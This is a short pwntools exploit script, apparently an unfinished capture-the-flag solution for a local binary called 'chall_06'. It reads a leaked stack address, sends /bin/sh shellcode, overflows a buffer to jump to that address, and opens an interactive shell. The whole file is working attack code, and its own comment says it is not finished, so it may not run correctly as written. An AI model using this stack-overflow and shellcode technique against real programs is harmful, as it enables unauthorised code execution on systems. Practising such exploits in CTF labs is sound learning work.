from pwn import *
binary = context.binary = ELF('./chall_06')
p = process(binary.path)
p.recvuntil('I drink milk even though i\'m lactose intolerant: ')
_ = p.recvline().strip()
stack = int(_,16)
p.sendline(b'' + asm(shellcraft.sh()))
p.sendline(b'' + (0x60-0x8)*b'A' + p64(stack))
p.interactive()
# NOT FINISHED
